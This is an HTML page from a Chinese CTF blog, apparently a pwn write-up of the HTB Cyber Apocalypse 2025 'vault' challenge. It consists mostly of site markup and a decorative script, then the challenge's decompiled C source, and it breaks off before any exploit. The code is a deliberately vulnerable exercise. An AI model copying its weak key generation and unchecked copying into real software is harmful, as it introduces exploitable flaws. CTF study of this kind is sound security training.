<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="‍" />
<meta property="og:description" content="‍" />
<link rel="canonical" href="http://localhost:4000/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/" />
<meta property="og:url" content="http://localhost:4000/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-03-27T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png" />
<meta property="twitter:title" content="HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2025-03-27T00:00:00+08:00","datePublished":"2025-03-27T00:00:00+08:00","description":"‍","headline":"HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp","image":"/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/"},"url":"http://localhost:4000/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/Friends/" class="nav-link">
            <i class="fa-fw fas fa-user-friends"></i>
            

            <span>FRIENDS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1743004800"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2025/03/27
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4695 字"
>
  <em>26 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>‍</p>

<pre><code class="language-info">https://ctftime.org/event/2674
</code></pre>

<p><a href="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-HTB-CACTFTFE/assets/image-20250410163701-0l4y4kw.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<h2 id="vault"><span class="me-2">vault</span><a href="#vault" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>题目并不难，但是这题也卡了我很长时间，怪我不够细，下次要细啊（我的粗😋）</p>

<p>‍</p>

<ul>
  <li>源码（手动恢复）</li>
</ul>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">Entry</span><span class="p">{</span>
  <span class="kt">char</span> <span class="n">url</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">pwd</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="kt">size_t</span> <span class="n">pwd_size</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">char</span> <span class="n">tmp_url</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
<span class="k">struct</span> <span class="n">Entry</span> <span class="n">entries</span><span class="p">[</span><span class="mh">0xA</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">global_key</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
<span class="kt">size_t</span> <span class="n">num_entries</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>


<span class="kt">void</span> <span class="nf">xor_buffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
  <span class="n">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rcx</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
      <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">(){</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
  <span class="n">srand</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">init_key</span><span class="p">(){</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx</span>

  <span class="n">v0</span> <span class="o">=</span> <span class="n">global_key</span><span class="p">;</span>
  <span class="k">do</span>
    <span class="o">*</span><span class="n">v0</span><span class="o">++</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">global_key</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">view_entries</span><span class="p">(){</span>
  <span class="k">struct</span> <span class="n">Entry</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rcx</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pwd_data</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">int</span> <span class="n">str_n</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">size_t</span> <span class="n">me_size</span><span class="p">;</span> <span class="c1">// rdx</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// r13</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// r14</span>
  <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rsi</span>
  <span class="n">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rdx</span>
  <span class="kt">size_t</span> <span class="n">pwd_len</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="k">struct</span> <span class="n">Entry</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-1D0h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-1BCh] BYREF</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">392</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-1B8h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+1A8h] [rbp-30h]</span>

  <span class="n">v13</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x180</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">scanf</span><span class="p">(</span><span class="s">"%u%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="n">num_entries</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Index."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">entries</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
      <span class="n">pwd_data</span> <span class="o">=</span> <span class="n">v0</span><span class="o">-&gt;</span><span class="n">pwd</span><span class="p">;</span>
      <span class="n">v10</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
      <span class="n">str_n</span> <span class="o">=</span> <span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x180uLL</span><span class="p">,</span> <span class="s">"Hostname:  %s</span><span class="se">\n</span><span class="s">Password:    "</span><span class="p">,</span> <span class="n">v0</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">);</span>
      <span class="n">me_size</span> <span class="o">=</span> <span class="n">v10</span><span class="o">-&gt;</span><span class="n">pwd_size</span><span class="p">;</span>
      <span class="n">v4</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">str_n</span><span class="p">];</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x180LL</span> <span class="o">-</span> <span class="n">str_n</span><span class="p">;</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">me_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">me_size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">do</span>
        <span class="p">{</span>
          <span class="n">pwd_data</span><span class="p">[</span><span class="n">v6</span><span class="p">]</span> <span class="o">^=</span> <span class="n">global_key</span><span class="p">[</span><span class="n">v6</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">];</span>
          <span class="n">v8</span> <span class="o">=</span> <span class="n">v6</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="n">v7</span> <span class="p">);</span>
      <span class="p">}</span>
      <span class="n">pwd_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">pwd_data</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">pwd_len</span> <span class="o">&gt;</span> <span class="n">v5</span> <span class="p">)</span>
        <span class="n">LODWORD</span><span class="p">(</span><span class="n">pwd_len</span><span class="p">)</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">&gt;=</span> <span class="mi">8</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">pwd_data</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">-</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pwd_data</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">-</span> <span class="mi">8</span><span class="p">];</span>
        <span class="n">qmemcpy</span><span class="p">(</span>
          <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">),</span>
          <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">pwd_data</span> <span class="o">-</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">[</span><span class="o">-</span><span class="p">((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF8LL</span><span class="p">)]),</span>
          <span class="mi">8LL</span> <span class="o">*</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pwd_len</span> <span class="o">+</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v4</span> <span class="o">-</span> <span class="p">(((</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">));</span>
      <span class="p">}</span>
